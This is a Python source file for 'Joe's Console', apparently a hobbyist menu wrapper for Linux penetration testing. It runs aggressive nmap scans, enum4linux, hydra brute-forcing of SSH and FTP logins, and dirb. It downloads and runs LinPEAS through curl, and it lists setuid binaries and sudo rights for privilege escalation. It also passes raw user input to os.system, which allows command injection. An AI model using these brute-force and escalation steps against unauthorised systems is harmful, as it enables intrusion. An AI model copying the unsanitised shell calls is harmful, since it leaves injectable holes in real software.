#Joe's Console is a Linux Tool designed to help with Linux based pentesting .
#Made by Joe issa

import os
from subprocess import run
from art import *
from time import sleep
from colorama import Fore, Style

tprint("Joe's Console",font="rnd-large")
print(f"{Fore.LIGHTCYAN_EX}PLEASE PICK AN OPTION{Style.RESET_ALL}")
print(f"{Fore.LIGHTCYAN_EX}------------------------{Style.RESET_ALL}")
print(f"{Fore.LIGHTBLUE_EX}Remote: {Style.RESET_ALL}    {Fore.RED}                                            Local:            {Style.RESET_ALL}")
print("R1.Run an Aggressive Nmap Scan                         ""\t""L1.LinPEAS - Local Enumeration Script               ")
print("R2.Remote Enumeration                                  ""\t""L2.Exploit Setuid                                   ")
print("R3.Run Easy_Hydra™                                     ""\t""L3.Exploit Sudo                                     ")
print("R4.DirBuster                                           ""\t""L4.Coming soon                                     ")
print("R5.Coming Soon                                         ""\t""L5.Coming Soon                                     ")
print(f"{Fore.LIGHTCYAN_EX}Ex : R1 or L2{Style.RESET_ALL} ")
def Nmap():
    TIP = input("Please Enter The Target IP : ")
    os.system('nmap -A -p- '+TIP)
    exit()
def En4Li():
    TIP = input("Please Enter The Target IP : ")
    os.system('enum4linux -a '+TIP)
    exit()
def EasyHydra():
    TIP = input("Please Enter The Target IP : ")
    print("Currently this tool supports only ssh and ftp services ")
    Service = input("What do you want to bruteforce ? (ssh or ftp) : ")
    if Service == "ssh":
        print("ssh it is !")
    elif Service == "ftp":
        print("ftp it is !")
        print("PS: You can try to login as anonymous")
    else:
        print("Unknown service or you are trying to be a smartass")
        exit()

    user = input("do you have a username ? (yes or no) :  ")
    if user == "yes":
        usery = input("please enter username : ")
    elif user == "no":
        userl = input("please enter a username list path")
        pathu = os.path.abspath(userl)
    else:
        print("please answer with a yes or no")
        exit()

    passw = input("do you have a password ? (yes or no) :  ")
    if passw == "yes":
        passwy = input("please enter the password : ")
    elif passw == "no":
        passwl = input("please enter a wordlist location : ")
        pathp = os.path.abspath(passwl)
    else:
        print("please answer with a yes or no")
        exit()

    if user == "yes" and passw == "yes":
        noob = input("you already have the credentials , what service do you need ? (ssh or ftp)")
        if noob == "ssh":
            run(["ssh", usery + "@" + TIP])
            exit()
        elif noob == "ftp":
            run(["ftp", TIP])
            exit()
        else:
            print("something is wrong , please try again")
            exit()

    if user == "yes" and passw == "no":
        run(["hydra", "-l", usery, "-P", pathp, Service + "://" + TIP])
    elif user == "no" and passw == "yes":
        run(["hydra", "-L", pathu, "-p", passwy, Service + "://" + TIP])
    else:
        print("this will take for ever , there must be another way !")
        exit()

def Dirb():
    WEB = input("Please Enter The Target Website address (http://10.10.10.10:80 or http://domainname.com : ")
    os.system('dirb '+WEB)
    exit()
def LinP():
    os.system('curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh > /tmp/Linp.sh && chmod 777 /tmp/Linp.sh')
    print("LinPEAS Successfully Downloaded ")
    LinPIn = input("Run LinPEAS now ? (yes or no)").lower()
    if LinPIn == "yes":
        os.system('/tmp/./Linp.sh')
        exit()
    else:
        print("Good Bye")
        exit()
def Estuid():
    print("dont forget to use https://gtfobins.github.io/ ")
    sleep(1)
    os.system('find / -perm -4000 2>/dev/null')
    exit()
def Esudo():
    print("dont forget to use https://gtfobins.github.io/ ")
    sleep(1)
    os.system('sudo -l')
    exit()

try:
    OPT = input(f"{Fore.LIGHTGREEN_EX}Please Select an Option to start : {Style.RESET_ALL}").upper()
    if OPT == "R1":
        Nmap()
    elif OPT == "R2":
        En4Li()
    elif OPT == "R3":
        EasyHydra()
    elif OPT == "R4":
        Dirb()
    elif OPT == "R5":
        print("This Feature is Coming soon!")
    elif OPT == "L1":
        LinP()
    elif OPT == "L2":
        Estuid()
    elif OPT == "L3":
        Esudo()
    elif OPT == "L4":
        print("This Feature is Coming soon!")
    elif OPT == "L5":
        print("This Feature is Coming soon!")
    else:
        print(f"{Fore.RED}Please Only Select R1 - R5 (Remote) or L1 - L5 (Local) {Style.RESET_ALL}")
except:
    print(f"{Fore.RED}Thank You .... Come again !{Style.RESET_ALL}")
